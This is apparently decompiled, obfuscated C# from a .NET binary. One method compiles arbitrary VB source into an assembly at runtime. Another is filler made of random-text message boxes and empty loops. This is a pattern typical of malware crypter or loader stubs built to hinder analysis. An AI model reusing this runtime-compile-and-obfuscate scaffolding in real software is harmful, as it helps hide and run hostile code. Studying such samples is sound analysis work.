using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace Sam;

internal class uz
{
	[DebuggerNonUserCode]
	public uz()
	{
		Class5.SUi8phazhjLmk();
		base._002Ector();
	}

	public static Assembly CompileSource(string Source)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		CompilerParameters val = new CompilerParameters();
		CompilerResults val2 = null;
		CodeDomProvider val3 = (CodeDomProvider)new VBCodeProvider();
		val.get_ReferencedAssemblies().Add("System.Windows.Forms.dll");
		val2 = val3.CompileAssemblyFromSource(val, new string[1] { Source });
		return val2.get_CompiledAssembly();
	}

	public object XFlfT3J3I0nR7Zo89FCJJUcty()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		new decimal(92295456L);
		MessageBox.Show("FX!„2V4t%n\u008f'ƒ$dV*5Œ\\5g\u0090‰,:MŒ/1 m\u008fm!€AƒŠH<^\u007fsfQf0„/Œ’q.8qZ+x‹(:d†mB*6#v49>d?jz=Bmg=( 7");
		MessageBox.Show(";utP‘-@D=p\u00817\u0090F70Ž&W@\u0081’…J)N mU‚H=L’+mKo\u008feS{d„)%}w,m6^8KW<‚IGb-e‚MGd}‘:\\w");
		new decimal(82623L);
		int num = 0;
		checked
		{
			do
			{
				new decimal(814663947L);
				for (int i = 54091358; i <= 0; i++)
				{
				}
				num++;
			}
			while (num <= 5431770);
			Interaction.MsgBox((object)"z(!YD\u007f\u008d9NRb'<*xjŒRTP9.G#YS]\u007fŠ^‘$U†HDjK]/ ma\u008dof C~30'F‹4kt\u0090’ƒB.A‚T^dItT `‡EO_`LG…R9 vN", (MsgBoxStyle)0, (object)null);
			return 22;
		}
	}
}
